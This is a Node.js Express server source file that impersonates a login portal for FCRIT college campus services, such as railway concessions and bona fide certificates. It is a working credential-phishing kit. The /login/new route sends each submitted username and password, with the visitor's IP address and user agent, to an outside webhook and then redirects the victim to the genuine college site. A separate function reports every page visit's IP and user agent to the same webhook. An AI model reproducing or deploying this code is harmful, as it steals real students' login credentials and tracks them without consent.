const bodyParser = require("body-parser");
const path = require("path");
const ejs = require("ejs");
const config = require('./config.json');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const express = require('express');

// View engines & others
const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.engine("html", ejs.renderFile);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, "/website/views"));
app.use(express.static(path.join(__dirname, "/website/public")));

app.set('json spaces', 1);

// Routes

// Pages
app.get('/', (req, res) => {
  sendHook(req)
  res.redirect('https://fcrit.ac.in/');
  // res.render('index', {
  //   title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility."
  // });
});

app.get('/login', (req, res) => {
  sendHook(req)
  res.render('index', {
    title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility."
  });
});

app.get('/login/:id', (req, res) => {
  sendHook(req);
  const user = req.params.id;
  res.render('index', {
    title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility.",
    user : user
  });
});


// Send route
app.post('/login/new', async (req, res) => {
  try {
    const username = req.body.username;
    const password = req.body.password;

    if (!username) {
      return res.status(400).render('error', { message: `Username is required` });
    }
     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const modifiedipString = clientIP.split(',')[0];
    const clientAgent = req.headers['user-agent'] || req.socket.remoteAddress;

    const webhookURL = process.env['hook'];
    const message = {
      content: 'New form submission',
      embeds: [
        {
          title: 'Form Submission',
          fields: [
            {
              name: 'Username',
              value: username,
            },
            {
              name: 'Password',
              value: password,
            },
            {
              name: 'Ip Address',
              value: modifiedipString,
            },
            {
              name: 'Browser user agent',
              value: clientAgent,
            },
          ],
        },
      ],
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    });

    res.redirect('https://fcrit.ac.in/');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: `Internal Server Error: ${err}` });
  }
});


app.listen(config.port, () => {
  console.log("Server running on port - " + config.port);
  console.log(`Made By ${config.copyright}`);
});

process.on('unhandledRejection', (reason, p) => {
  console.log(' [antiCrash] :: Unhandled Rejection/Catch');
  console.log(reason, p);
});
process.on('uncaughtException', (err, origin) => {
  console.log(' [antiCrash] :: Uncaught Exception/Catch');
  console.log(err, origin);
});
process.on('uncaughtExceptionMonitor', (err, origin) => {
  console.log(' [antiCrash] :: Uncaught Exception/Catch (MONITOR)');
  console.log(err, origin);
});
process.on('multipleResolves', (type, promise, reason) => {
  console.log(' [antiCrash] :: Multiple Resolves');
  console.log(type, promise, reason);
});


// Define a function to handle form submissions
async function sendHook(req) {
  try {
     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const modifiedipString = clientIP.split(',')[0];
    const clientAgent = req.headers['user-agent'] || req.socket.remoteAddress;

    const webhookURL = process.env['hook'];
    const message = {
      content: 'New capture',
      embeds: [
        {
          title: 'get requested lol',
          fields: [
            {
              name: 'Ip Address',
              value: modifiedipString,
            },
            {
              name: 'Browser user agent',
              value: clientAgent,
            },
          ],
        },
      ],
    };

    // Send the data to the webhook
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    });

    console.log('Form submission data sent successfully.');
  } catch (error) {
    console.error('Error sending form submission data:', error.message);
  }
}

